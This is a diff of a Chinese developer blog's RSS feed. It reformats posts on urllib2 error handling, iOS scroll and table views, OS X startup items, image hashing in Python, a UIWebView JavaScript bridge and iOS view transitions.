-&lt;p&gt;ps.以上的server的环境是在2.1.3的基础上server我放了个压缩包&lt;a href=&quot;http://snorlax-wordpress.stor.sinaapp.com/uploads/2013/03/server1.zip&quot;&gt;server&lt;/a&gt;&lt;/p&gt;
+8.你自由了:-)
 
-&lt;p&gt;&lt;/p&gt;
-</description>
+ps.以上的server的环境是在2.1.3的基础上server我放了个压缩包server
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
                 <link>http://snorlaxzxz.com/program/2013/03/07/%E5%85%B3%E4%BA%8Eios%E4%B8%8B%E7%9A%84goagent%E4%BD%BF%E7%94%A8</link>
                 <guid>http://snorlaxzxz.com/program/2013/03/07/关于ios下的goagent使用</guid>
                 <pubDate>2013-03-07T00:00:00+08:00</pubDate>
@@ -1230,23 +1200,23 @@ SimpleHTTPServer.test()
 
         <item>
                 <title>关于处理掉urllib2中的错误提示异常</title>
-                <description>&lt;p&gt;在很多情况下如果server帮着redirect一下什么的、如果还使用urllib2的urlopen非常容易抛出异常、而且既然人家给你跳转了你照着搬不就完了么混蛋……&lt;br /&gt;
+                <description>&lt;p&gt;&lt;p&gt;在很多情况下如果server帮着redirect一下什么的、如果还使用urllib2的urlopen非常容易抛出异常、而且既然人家给你跳转了你照着搬不就完了么混蛋……&lt;br /&gt;
 然后下面讲下怎么除掉掉这些异常其实很简单&lt;br /&gt;
 再构建的时候对urllib2.HTTPCookieProcessor进行复写、把里面的异常的地方给复写掉&lt;br /&gt;
-代码如下
-&lt;pre lang=&quot;python&quot;&gt;
-class NoExceptionCookieProcesser(urllib2.HTTPCookieProcessor):
+代码如下&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;class NoExceptionCookieProcesser(urllib2.HTTPCookieProcessor):
     def http_error_500(self, req, fp, code, msg, hdrs):
         return fp
-&lt;/pre&gt;
-以此类推想弄掉哪儿些复写掉即可&lt;br /&gt;
+
+以此类推想弄掉哪儿些复写掉即可
 然后构造的时候
-&lt;pre lang=&quot;python&quot;&gt;
+
 cookie = cookielib.CookieJar()
 opener = urllib2.build_opener(NoExceptionCookieProcesser(cookie))
-&lt;/pre&gt;
-行了、这样讨厌的异常就搞定了&lt;/p&gt;
-</description>
+
+行了、这样讨厌的异常就搞定了
+&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
                 <link>http://snorlaxzxz.com/%E6%9C%AA%E5%88%86%E7%B1%BB/2013/01/21/%E5%85%B3%E4%BA%8E%E5%A4%84%E7%90%86%E6%8E%89urllib2%E4%B8%AD%E7%9A%84%E9%94%99%E8%AF%AF%E6%8F%90%E7%A4%BA%E5%BC%82%E5%B8%B8</link>
                 <guid>http://snorlaxzxz.com/%E6%9C%AA%E5%88%86%E7%B1%BB/2013/01/21/关于处理掉urllib2中的错误提示异常</guid>
                 <pubDate>2013-01-21T00:00:00+08:00</pubDate>
@@ -1254,13 +1224,12 @@ opener = urllib2.build_opener(NoExceptionCookieProcesser(cookie))
 
         <item>
                 <title>关于嵌套与UIScrollView中的UITableVIew的冲突解决</title>
-                <description>&lt;p&gt;周知tableview是继承自scrollview的、一旦如果在scrollview上add上子的table那么双方的滚动就冲突了、只能选择其一、apple的文档里也讲了两者是冲突的不要加子table到scroll上、但是发现其实还是有解决方法的&lt;br /&gt;
-首先的关键点就是禁掉两方的任意一个ScrollEnabled另一方就可以滚动了、所以就从这下手其实思路也非常简单、就是给table加一个gesture、捕捉提前捕捉事件然后禁掉背的scroll的滚动话不多讲上代码
-&lt;pre lang=&quot;objective-c&quot;&gt;
-- (void)viewDidLoad
+                <description>&lt;p&gt;&lt;p&gt;周知tableview是继承自scrollview的、一旦如果在scrollview上add上子的table那么双方的滚动就冲突了、只能选择其一、apple的文档里也讲了两者是冲突的不要加子table到scroll上、但是发现其实还是有解决方法的&lt;br /&gt;
+首先的关键点就是禁掉两方的任意一个ScrollEnabled另一方就可以滚动了、所以就从这下手其实思路也非常简单、就是给table加一个gesture、捕捉提前捕捉事件然后禁掉背的scroll的滚动话不多讲上代码&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;- (void)viewDidLoad
 {
     [super viewDidLoad];
-	// Do any additional setup after loading the view, typically from a nib.
+    // Do any additional setup after loading the view, typically from a nib.
     scr=[[UIScrollView alloc]initWithFrame:CGRectMake(0, 0, 320, 440)];
     scr.delegate=self;
     [scr setContentSize:CGSizeMake(320, 800)];
@@ -1278,9 +1247,9 @@ opener = urllib2.build_opener(NoExceptionCookieProcesser(cookie))
     [scr addSubview:pand];
     [scr addSubview:tableView];
 }
-&lt;/pre&gt;
+
 然后是回调
-&lt;pre lang=&quot;objective-c&quot;&gt;
+
 -(BOOL)gestureRecognizer:(UIGestureRecognizer *)gestureRecognizer shouldRecognizeSimultaneouslyWithGestureRecognizer:(UIGestureRecognizer *)otherGestureRecognizer
 {
     //切记这个代理必须要设置、因为scroll的拖动说白了也是一个gesture、为了流畅性必须要两个触碰事件同时触发
@@ -1291,16 +1260,17 @@ opener = urllib2.build_opener(NoExceptionCookieProcesser(cookie))
     //这里就是让背景的拖动定死这样就不冲突了
     if ([gesture state]==UIGestureRecognizerStateBegan) {
         [scr setScrollEnabled:NO];
-    }&lt;/pre&gt;&lt;/p&gt;
+    }
 
-&lt;p&gt;}&lt;br /&gt;
--(void)scrollViewDidEndDragging:(UIScrollView *)scrollView willDecelerate:(BOOL)decelerate&lt;br /&gt;
-{
-    //拖动完再恢复&lt;br /&gt;
-    [scr setScrollEnabled:YES];&lt;br /&gt;
 }
-&lt;/p&gt;
-</description>
+-(void)scrollViewDidEndDragging:(UIScrollView *)scrollView willDecelerate:(BOOL)decelerate
+{
+    //拖动完再恢复
+    [scr setScrollEnabled:YES];
+}
+
+&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
                 <link>http://snorlaxzxz.com/program/2013/01/07/%E5%85%B3%E4%BA%8E%E5%B5%8C%E5%A5%97%E4%B8%8Euiscrollview%E4%B8%AD%E7%9A%84uitableview%E7%9A%84%E5%86%B2%E7%AA%81%E8%A7%A3%E5%86%B3</link>
                 <guid>http://snorlaxzxz.com/program/2013/01/07/关于嵌套与uiscrollview中的uitableview的冲突解决</guid>
                 <pubDate>2013-01-07T00:00:00+08:00</pubDate>
@@ -1329,67 +1299,68 @@ opener = urllib2.build_opener(NoExceptionCookieProcesser(cookie))
 
 &lt;p&gt;然后解释下里面分别怎么写&lt;/p&gt;
 
-&lt;p&gt;首先是 StartupParameters.plist这个xml里面的内容大致是
-&lt;pre&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
-&amp;lt;!DOCTYPE plist PUBLIC &quot;-//Apple Computer//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&amp;gt;
-&amp;lt;plist version=&quot;1.0&quot;&amp;gt;
-&amp;lt;dict&amp;gt;
-	&amp;lt;key&amp;gt;Description&amp;lt;/key&amp;gt;
-	&amp;lt;string&amp;gt;MySQL 5.5.20-community&amp;lt;/string&amp;gt;
-	&amp;lt;key&amp;gt;OrderPreference&amp;lt;/key&amp;gt;
-	&amp;lt;string&amp;gt;None&amp;lt;/string&amp;gt;
-	&amp;lt;key&amp;gt;Provides&amp;lt;/key&amp;gt;
-	&amp;lt;array&amp;gt;
-		&amp;lt;string&amp;gt;MySQL&amp;lt;/string&amp;gt;
-	&amp;lt;/array&amp;gt;
-	&amp;lt;key&amp;gt;Uses&amp;lt;/key&amp;gt;
-	&amp;lt;array&amp;gt;
-		&amp;lt;string&amp;gt;Network&amp;lt;/string&amp;gt;
-		&amp;lt;string&amp;gt;Resolver&amp;lt;/string&amp;gt;
-	&amp;lt;/array&amp;gt;
-	&amp;lt;/dict&amp;gt;
-&amp;lt;/plist&amp;gt;&lt;/pre&gt;
-&lt;pre&gt;主要有几个key description OrderPreference Provides Uses&lt;/pre&gt;
-&lt;pre&gt;具体是什么如下&lt;/pre&gt;
-&quot;Description&quot; is a simple description of the service, which is only used to describe the file and not during the startup process.&lt;/p&gt;
+&lt;p&gt;&lt;p&gt;首先是 StartupParameters.plist这个xml里面的内容大致是&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&amp;amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;amp;gt;
+&amp;amp;lt;!DOCTYPE plist PUBLIC &amp;quot;-//Apple Computer//DTD PLIST 1.0//EN&amp;quot; &amp;quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&amp;quot;&amp;amp;gt;
+&amp;amp;lt;plist version=&amp;quot;1.0&amp;quot;&amp;amp;gt;
+&amp;amp;lt;dict&amp;amp;gt;
+    &amp;amp;lt;key&amp;amp;gt;Description&amp;amp;lt;/key&amp;amp;gt;
+    &amp;amp;lt;string&amp;amp;gt;MySQL 5.5.20-community&amp;amp;lt;/string&amp;amp;gt;
+    &amp;amp;lt;key&amp;amp;gt;OrderPreference&amp;amp;lt;/key&amp;amp;gt;
+    &amp;amp;lt;string&amp;amp;gt;None&amp;amp;lt;/string&amp;amp;gt;
+    &amp;amp;lt;key&amp;amp;gt;Provides&amp;amp;lt;/key&amp;amp;gt;
+    &amp;amp;lt;array&amp;amp;gt;
+        &amp;amp;lt;string&amp;amp;gt;MySQL&amp;amp;lt;/string&amp;amp;gt;
+    &amp;amp;lt;/array&amp;amp;gt;
+    &amp;amp;lt;key&amp;amp;gt;Uses&amp;amp;lt;/key&amp;amp;gt;
+    &amp;amp;lt;array&amp;amp;gt;
+        &amp;amp;lt;string&amp;amp;gt;Network&amp;amp;lt;/string&amp;amp;gt;
+        &amp;amp;lt;string&amp;amp;gt;Resolver&amp;amp;lt;/string&amp;amp;gt;
+    &amp;amp;lt;/array&amp;amp;gt;
+    &amp;amp;lt;/dict&amp;amp;gt;
+&amp;amp;lt;/plist&amp;amp;gt;
+主要有几个key description OrderPreference Provides Uses
+具体是什么如下
+&amp;quot;Description&amp;quot; is a simple description of the service, which is only used to describe the file and not during the startup process.
 
-&lt;p&gt;&quot;Provides&quot; specifies the services that this StartupItems provides. Provides can contain multiple services, but it is not recommended. Here Apache provides a &quot;Web Server&quot; service.&lt;/p&gt;
+&amp;quot;Provides&amp;quot; specifies the services that this StartupItems provides. Provides can contain multiple services, but it is not recommended. Here Apache provides a &amp;quot;Web Server&amp;quot; service.
 
-&lt;p&gt;&quot;Requires&quot; specifies the services that have to be started before this StartupItem is loaded. The values in this field are those of other StartupItems&#39; &quot;Provides&quot; fields. Apache requires &quot;DirectoryServices&quot; to be loaded before it can be run; if DirectoryServices are not specified to run or fail to run properly Apache won&#39;t run.&lt;/p&gt;
+&amp;quot;Requires&amp;quot; specifies the services that have to be started before this StartupItem is loaded. The values in this field are those of other StartupItems&amp;#39; &amp;quot;Provides&amp;quot; fields. Apache requires &amp;quot;DirectoryServices&amp;quot; to be loaded before it can be run; if DirectoryServices are not specified to run or fail to run properly Apache won&amp;#39;t run.
 
-&lt;p&gt;&quot;Uses&quot; specifics the services that should be started before this StartupItem is loaded. This is similar to the &quot;Requires&quot; attribute except this service will always be loaded, but only after it has tried to execute all the services in &quot;Uses&quot;. Apache uses the &quot;Disks&quot;, &quot;NFS&quot;, and &quot;Network Time&quot; services. OS X will try to load these services, if it can&#39;t it will still load Apache, but only after trying these services first.&lt;/p&gt;
+&amp;quot;Uses&amp;quot; specifics the services that should be started before this StartupItem is loaded. This is similar to the &amp;quot;Requires&amp;quot; attribute except this service will always be loaded, but only after it has tried to execute all the services in &amp;quot;Uses&amp;quot;. Apache uses the &amp;quot;Disks&amp;quot;, &amp;quot;NFS&amp;quot;, and &amp;quot;Network Time&amp;quot; services. OS X will try to load these services, if it can&amp;#39;t it will still load Apache, but only after trying these services first.
 
-&lt;p&gt;&quot;OrderPreference&quot; specifies the general time period in which a StartupItem will be executed. This order is less significant than both &quot;Requires&quot; and &quot;Uses&quot; but is used to determine order after evaluating those attributes. The possible values for this attribute are: First, Early, None (default), Late, Last. Apache specifies no OrderPreference as to when it should be loaded.&lt;/p&gt;
+&amp;quot;OrderPreference&amp;quot; specifies the general time period in which a StartupItem will be executed. This order is less significant than both &amp;quot;Requires&amp;quot; and &amp;quot;Uses&amp;quot; but is used to determine order after evaluating those attributes. The possible values for this attribute are: First, Early, None (default), Late, Last. Apache specifies no OrderPreference as to when it should be loaded.
 
-&lt;p&gt;然后就是写的脚本了&lt;/p&gt;
+然后就是写的脚本了
 
-&lt;p&gt;简单点的写法就这样
-&lt;pre&gt;#!/bin/sh
-. /etc/rc.common&lt;/pre&gt;&lt;/p&gt;
+简单点的写法就这样
+#!/bin/sh
+. /etc/rc.common
 
-&lt;p&gt;StartService ()&lt;br /&gt;
+StartService ()
 {
-    ConsoleMessage &quot;Running script.&quot;&lt;br /&gt;
-    python /Users/zxz/work/xxxx.py&lt;br /&gt;
-}&lt;/p&gt;
+    ConsoleMessage &amp;quot;Running script.&amp;quot;
+    python /Users/zxz/work/xxxx.py
+}
 
-&lt;p&gt;StopService ()&lt;br /&gt;
+StopService ()
 {
-    return 0&lt;br /&gt;
-}&lt;/p&gt;
+    return 0
+}
 
-&lt;p&gt;RestartService ()&lt;br /&gt;
+RestartService ()
 {
-    return 0&lt;br /&gt;
-}&lt;/p&gt;
+    return 0
+}
 
-&lt;p&gt;RunService &quot;$1&quot;
-里面的shell就随意怎么写了&lt;/p&gt;
+RunService &amp;quot;$1&amp;quot;
+里面的shell就随意怎么写了
 
-&lt;p&gt;然后正常的 start stop restart也都可以正常用了&lt;/p&gt;
+然后正常的 start stop restart也都可以正常用了
 
-&lt;p&gt;ps.最后记得注意要修改脚本的权限……chown root:wheel chmod 755&lt;/p&gt;
-</description>
+ps.最后记得注意要修改脚本的权限……chown root:wheel chmod 755
+&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
                 <link>http://snorlaxzxz.com/program/2012/12/23/os-x-%E7%9A%84%E5%90%AF%E5%8A%A8%E9%A1%B9</link>
                 <guid>http://snorlaxzxz.com/program/2012/12/23/os-x-的启动项</guid>
                 <pubDate>2012-12-23T00:00:00+08:00</pubDate>
@@ -1397,7 +1368,7 @@ opener = urllib2.build_opener(NoExceptionCookieProcesser(cookie))
 
         <item>
                 <title>相似图片搜索python实现</title>
-                <description>&lt;p&gt;先贴原文http://blog.csdn.net/luohong722/article/details/7100058&lt;br /&gt;
+                <description>&lt;p&gt;&lt;p&gt;先贴原文&lt;a href=&quot;http://blog.csdn.net/luohong722/article/details/7100058&quot;&gt;http://blog.csdn.net/luohong722/article/details/7100058&lt;/a&gt;&lt;br /&gt;
 其实这篇文章已经写的非常详细了、不过也作为巩固自己再梳理一遍&lt;br /&gt;
 首先这个算法的流程简直简单的令人发指、导致我做的时候完全不觉得这真的可能搜索出什么东西来……&lt;br /&gt;
 几步流程分别如下&lt;br /&gt;
@@ -1408,28 +1379,29 @@ opener = urllib2.build_opener(NoExceptionCookieProcesser(cookie))
 5.比较标示码 越接近越相似&lt;br /&gt;
 貌似好像应该是sift算法的简便吧（也不能简便成这样啊……&lt;br /&gt;
 ---------------------------下面是程序主要逻辑一共就十几行--------------------------&lt;br /&gt;
-主要用到了python的PIL库
-&lt;pre lang=&quot;python&quot;&gt;from PIL import Image
+主要用到了python的PIL库&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;from PIL import Image
 def picHash(im):
     if not isinstance(im, Image.Image):
         im = Image.open(im)
     #平滑的压成8*8 并灰化
-    im = im.resize((8, 8), Image.ANTIALIAS).convert(&#39;L&#39;)
+    im = im.resize((8, 8), Image.ANTIALIAS).convert(&amp;#39;L&amp;#39;)
     avg = reduce(lambda x, y: x + y, im.getdata()) / 64.0
-    return map(lambda i: 0 if i &amp;lt; avg else 1, im.getdata())&lt;/pre&gt;&lt;/p&gt;
+    return map(lambda i: 0 if i &amp;amp;lt; avg else 1, im.getdata())
 
-&lt;p&gt;def diffCount(h1,h2):&lt;br /&gt;
-    h=0&lt;br /&gt;
-    for i in range(64):&lt;br /&gt;
-       if h1[i]!=h2[i]:&lt;br /&gt;
-           h+=1&lt;br /&gt;
+def diffCount(h1,h2):
+    h=0
+    for i in range(64):
+       if h1[i]!=h2[i]:
+           h+=1
     return h
-然后呢……然后没了……就是那么简单……最后发一下效果图&lt;br /&gt;
-图片样本20张&lt;a href=&quot;http://snorlax-wordpress.stor.sinaapp.com/uploads/2012/12/74BFFDE7-DC44-4DB1-9764-8DA9A3F4A913.jpg&quot;&gt;&lt;img class=&quot;alignnone size-full wp-image-163&quot; title=&quot;74BFFDE7-DC44-4DB1-9764-8DA9A3F4A913&quot; src=&quot;http://snorlax-wordpress.stor.sinaapp.com/uploads/2012/12/74BFFDE7-DC44-4DB1-9764-8DA9A3F4A913.jpg&quot; alt=&quot;&quot; width=&quot;518&quot; height=&quot;567&quot; /&gt;&lt;/a&gt;
+然后呢……然后没了……就是那么简单……最后发一下效果图
+图片样本20张
 最后搜出的近似度前5的左上为搜索原图
-&lt;a href=&quot;http://snorlax-wordpress.stor.sinaapp.com/uploads/2012/12/屏幕快照-2012-12-07-下午9.15.12.png&quot;&gt;&lt;img class=&quot;alignnone size-full wp-image-164&quot; title=&quot;屏幕快照 2012-12-07 下午9.15.12&quot; src=&quot;http://snorlax-wordpress.stor.sinaapp.com/uploads/2012/12/屏幕快照-2012-12-07-下午9.15.12.png&quot; alt=&quot;&quot; width=&quot;1440&quot; height=&quot;900&quot; /&gt;&lt;/a&gt;
-效果还是非常不错的、样本里只有一张未被选出&lt;/p&gt;
-</description>
+
+效果还是非常不错的、样本里只有一张未被选出
+&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
                 <link>http://snorlaxzxz.com/program/2012/12/07/%E7%9B%B8%E4%BC%BC%E5%9B%BE%E7%89%87%E6%90%9C%E7%B4%A2python%E5%AE%9E%E7%8E%B0</link>
                 <guid>http://snorlaxzxz.com/program/2012/12/07/相似图片搜索python实现</guid>
                 <pubDate>2012-12-07T00:00:00+08:00</pubDate>
@@ -1502,17 +1474,19 @@ http://www.pythonware.com/library/pil/handbook/index.htm&lt;/p&gt;
 既然js无法获得回调、就从webview的回调入手、查了他的三个delegate后办法有了、就是更改document.location加一个?xx=xx相当于一个get请求、然后通过回调去拿到xx然后做native&lt;br /&gt;
 可是这样我马上就发现了不适宜contenteditable的一个问题、就是一个点击事件同时触发了编辑以及跳转事件后、后者覆盖了前者、网上主流说的也是这个方法、找了半天终于找到了替代法&lt;a href=&quot;http://blog.devtang.com/blog/2012/03/24/talk-about-uiwebview-and-phonegap/&quot;&gt;&lt;/a&gt;详见最后的这段js代码、最后需要做的就是给需要编辑的标签绑定上事件 通过鼠标的点击拿到pageY的偏移量 通过uiwebview.uiscrollview setContentOffset来调整偏移量即可修复safari5对contenteditable这极不友好的支持、代码如下&lt;/p&gt;
 
-&lt;p&gt;&lt;pre lang=&quot;javascript&quot;&gt;
+&lt;p&gt;
+```
+
 var edit = document.getElementById(\&quot;editable\&quot;);edit.addEventListener(\&quot;click\&quot;,function(e){var iFrame;iFrame = document.createElement(\&quot;iframe\&quot;);iFrame.setAttribute(\&quot;src\&quot;, \&quot;noteOffset:\&quot;+e.pageY);iFrame.setAttribute(\&quot;style\&quot;, \&quot;display:none;\&quot;);iFrame.setAttribute(\&quot;height\&quot;, \&quot;0px\&quot;);iFrame.setAttribute(\&quot;width\&quot;, \&quot;0px\&quot;);iFrame.setAttribute(\&quot;frameborder\&quot;, \&quot;0\&quot;);document.body.appendChild(iFrame);iFrame.parentNode.removeChild(iFrame);iFrame = null;}, false);
-&lt;/pre&gt;
+
 然后在回调中写
-&lt;pre lang=&quot;objective-c&quot;&gt;
+
 #pragma UIWebViewDelegate
 -(BOOL)webView:(UIWebView *)webView shouldStartLoadWithRequest:(NSURLRequest *)request navigationType:(UIWebViewNavigationType)navigationType
 {
     NSLog(@&quot;------&quot;);
     NSLog(@&quot;%@&quot;,[[request URL]absoluteString]);
-    if ([[[request URL]absoluteString]judgeNoteBodyEditMode] &amp;&amp; [[request URL]absoluteString].length&gt;3) {
+    if ([[[request URL]absoluteString]judgeNoteBodyEditMode] &amp;&amp; [[request URL]absoluteString].length&gt;&gt;3) {
         
         NSLog(@&quot;%d&quot;,[[[[request URL]absoluteString]substringFromIndex:[[request URL]absoluteString].length-3]integerValue]);
         [showRichText.scrollView setContentOffset:CGPointMake(showRichText.scrollView.contentOffset.x,[[[[request URL]absoluteString]substringFromIndex:[[request URL]absoluteString].length-3]integerValue])];
@@ -1534,59 +1508,64 @@ var edit = document.getElementById(\&quot;editable\&quot;);edit.addEventListener
 &lt;a href=&quot;http://www.cnblogs.com/lovecode/articles/2249548.html&quot;&gt;http://www.cnblogs.com/lovecode/articles/2249548.html&lt;/a&gt;
 在理解的基础上上就是几个常用的切换了&lt;br /&gt;
 首先如果整体用的是navigationcontroller 的话常用的就是这三组方法
-&lt;pre lang=&quot;objective-c&quot;&gt;
-- (void)pushViewController:(UIViewController *)viewController animated:(BOOL)animated; // Uses a horizontal slide transition. Has no effect if the view controller is already in the stack.&lt;/pre&gt;&lt;/p&gt;
 
-&lt;p&gt;- (UIViewController *)popViewControllerAnimated:(BOOL)animated; // Returns the popped controller.&lt;br /&gt;
-- (NSArray *)popToViewController:(UIViewController *)viewController animated:(BOOL)animated; // Pops view controllers until the one specified is on top. Returns the popped controllers.&lt;br /&gt;
-- (NSArray *)popToRootViewControllerAnimated:(BOOL)animated; // Pops until there&#39;s only a single view controller left on the stack. Returns the popped controllers.&lt;/p&gt;
+```
 
-&lt;p&gt;
-这三种的切换效果基本都是左右推送那种感觉&lt;/p&gt;
+- (void)pushViewController:(UIViewController *)viewController animated:(BOOL)animated; // Uses a horizontal slide transition. Has no effect if the view controller is already in the stack.
 
-&lt;p&gt;再然后是用这两组切换
-&lt;pre lang=&quot;objective-c&quot;&gt;
+- (UIViewController *)popViewControllerAnimated:(BOOL)animated; // Returns the popped controller.
+- (NSArray *)popToViewController:(UIViewController *)viewController animated:(BOOL)animated; // Pops view controllers until the one specified is on top. Returns the popped controllers.
+- (NSArray *)popToRootViewControllerAnimated:(BOOL)animated; // Pops until there&#39;s only a single view controller left on the stack. Returns the popped controllers.
+
+
+这三种的切换效果基本都是左右推送那种感觉
+
+再然后是用这两组切换
+
 - (void)presentViewController:(UIViewController *)viewControllerToPresent animated: (BOOL)flag completion:(void (^)(void))completion NS_AVAILABLE_IOS(5_0);
 // The completion handler, if provided, will be invoked after the dismissed controller&#39;s viewDidDisappear: callback is invoked.
-- (void)dismissViewControllerAnimated: (BOOL)flag completion: (void (^)(void))completion NS_AVAILABLE_IOS(5_0);&lt;/pre&gt;&lt;/p&gt;
+- (void)dismissViewControllerAnimated: (BOOL)flag completion: (void (^)(void))completion NS_AVAILABLE_IOS(5_0);
 
-&lt;p&gt;// Display another view controller as a modal child. Uses a vertical sheet transition if animated.This method has been replaced by presentViewController:animated:completion:&lt;br /&gt;
-- (void)presentModalViewController:(UIViewController *)modalViewController animated:(BOOL)animated NS_DEPRECATED_IOS(2_0, 6_0);&lt;/p&gt;
+// Display another view controller as a modal child. Uses a vertical sheet transition if animated.This method has been replaced by presentViewController:animated:completion:
+- (void)presentModalViewController:(UIViewController *)modalViewController animated:(BOOL)animated NS_DEPRECATED_IOS(2_0, 6_0);
 
-&lt;p&gt;// Dismiss the current modal child. Uses a vertical sheet transition if animated. This method has been replaced by dismissViewControllerAnimated:completion:&lt;br /&gt;
-- (void)dismissModalViewControllerAnimated:(BOOL)animated NS_DEPRECATED_IOS(2_0, 6_0);&lt;/p&gt;
+// Dismiss the current modal child. Uses a vertical sheet transition if animated. This method has been replaced by dismissViewControllerAnimated:completion:
+- (void)dismissModalViewControllerAnimated:(BOOL)animated NS_DEPRECATED_IOS(2_0, 6_0);
 
-&lt;p&gt;
-这几种的默认的动画是上下卷（翻？）&lt;br /&gt;
+
+这几种的默认的动画是上下卷（翻？）
 最简单的更改动画方式就是在下一层需要切换的试图上使用 setModalTransitionStyle 方法可以设置为以下几种效果
-&lt;pre lang=&quot;objective-c&quot;&gt;
-UIModalTransitionStyleCoverVertical = 0,//垂直上下（默认那种）    UIModalTransitionStyleFlipHorizontal, //翻页&lt;/pre&gt;&lt;/p&gt;
 
-&lt;p&gt;    UIModalTransitionStyleCrossDissolve, //淡出&lt;/p&gt;
+UIModalTransitionStyleCoverVertical = 0,//垂直上下（默认那种）    UIModalTransitionStyleFlipHorizontal, //翻页
 
-&lt;p&gt;#if __IPHONE_OS_VERSION_MAX_ALLOWED &gt;= __IPHONE_3_2&lt;/p&gt;
+    UIModalTransitionStyleCrossDissolve, //淡出
+
+#if __IPHONE_OS_VERSION_MAX_ALLOWED &gt;&gt;= __IPHONE_3_2&lt;/p&gt;
 
 &lt;p&gt;    UIModalTransitionStylePartialCurl, //立体&lt;/p&gt;
 
 &lt;p&gt;&lt;/p&gt;
 
-&lt;p&gt;再然后如果需要更加精细的定制动画那么就要动用上#import &lt;QuartzCore/QuartzCore.h&gt;了在framework中加入QuartzCore然后使用CATransition对layer进行设置、这段代码一半可以加在viewWillAppear viewWillDisapper这两个地方中使用、大致的用法如下
-&lt;pre lang=&quot;objective-c&quot;&gt;
-        CATransition *animation=[CATransition animation];
+&lt;p&gt;&lt;p&gt;再然后如果需要更加精细的定制动画那么就要动用上#import &lt;QuartzCore/QuartzCore.h&gt;了在framework中加入QuartzCore然后使用CATransition对layer进行设置、这段代码一半可以加在viewWillAppear viewWillDisapper这两个地方中使用、大致的用法如下&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;        CATransition *animation=[CATransition animation];
         animation.delegate = self;
         animation.duration = 0.1f;//动画运行时间
         animation.timingFunction = UIViewAnimationCurveEaseInOut;//动画的时间分布（平均、两头快、快到慢等）
         animation.fillMode =  kCAFillModeForwards;//(填充的方式)
         animation.type = kCATransitionPush;//(动画覆盖过去的样子比如push movein等)
         animation.subtype = kCATransitionFromLeft;//(动画的方向)
-        [self.view.layer addAnimation:animation forKey:@&quot;animation&quot;];//给这张view的layer层添加这个动画并给个key一会用来删除
-        [self.view.layer removeAnimationForKey:@&quot;animation&quot;];//用来删&lt;/pre&gt;&lt;/p&gt;
+        [self.view.layer addAnimation:animation forKey:@&amp;quot;animation&amp;quot;];//给这张view的layer层添加这个动画并给个key一会用来删除
+        [self.view.layer removeAnimationForKey:@&amp;quot;animation&amp;quot;];//用来删
 
-&lt;p&gt;&lt;/p&gt;
 
-&lt;p&gt;基本几种方法就是这样然后有一点小技巧&lt;br /&gt;
-在正常的addsubView等方法使用动画CATransition的动画是安全没有问题的、可是如果你使用presentModalViewController等类似的会把之前的清掉的方法时就会出现一个问题、因为前面清掉了所以背景是黑色的、整个动画是做在黑色背景上的非常难看。在不破坏自己原来代码架构的情况下我就想到了一个方法在presentmodalviewController里的animated的参数置为YES然后设置为淡出效果、然后再继续用CATransition、这样相当于同时做两个动画但是那个淡出效果很淡看得很舒服完全是不会影响本来写得动画效果的&lt;/p&gt;
-</description>
+
+基本几种方法就是这样然后有一点小技巧
+在正常的addsubView等方法使用动画CATransition的动画是安全没有问题的、可是如果你使用presentModalViewController等类似的会把之前的清掉的方法时就会出现一个问题、因为前面清掉了所以背景是黑色的、整个动画是做在黑色背景上的非常难看。在不破坏自己原来代码架构的情况下我就想到了一个方法在presentmodalviewController里的animated的参数置为YES然后设置为淡出效果、然后再继续用CATransition、这样相当于同时做两个动画但是那个淡出效果很淡看得很舒服完全是不会影响本来写得动画效果的
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;blockquote&gt;
+&lt;/blockquote&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
                 <link>http://snorlaxzxz.com/program/2012/12/03/ios%E5%87%A0%E7%A7%8D%E5%9F%BA%E6%9C%AC%E8%A7%86%E5%9B%BE%E5%88%87%E6%8D%A2%E5%8A%A8%E7%94%BB%E5%B0%8F%E7%BB%93</link>
                 <guid>http://snorlaxzxz.com/program/2012/12/03/ios几种基本视图切换动画小结</guid>
                 <pubDate>2012-12-03T00:00:00+08:00</pubDate>
@@ -1594,135 +1573,136 @@ UIModalTransitionStyleCoverVertical = 0,//垂直上下（默认那种）    UIMo
 
         <item>
                 <title>bmp、png初理解</title>
-                <description>&lt;p&gt;主要还是写下bmp图的操作(另外两个看的实在头大&lt;br /&gt;
+                <description>&lt;p&gt;&lt;p&gt;主要还是写下bmp图的操作(另外两个看的实在头大&lt;br /&gt;
 首先bmp的头是由三部分组成的、分别是位图头、位图信息、调色板&lt;br /&gt;
 下面就是位图数据了&lt;br /&gt;
-详见&lt;a href=&quot;http://zh.wikipedia.org/zh/BMP#.E8.B0.83.E8.89.B2.E6.9D.BF&quot;&gt;http://zh.wikipedia.org/zh/BMP#.E8.B0.83.E8.89.B2.E6.9D.BF&lt;/a&gt;
-我用了以下的三个结构体用来接bmp头 然后再一个来接像素数据
-&lt;pre lang=&quot;c&quot; colla=&quot;+&quot;&gt;//
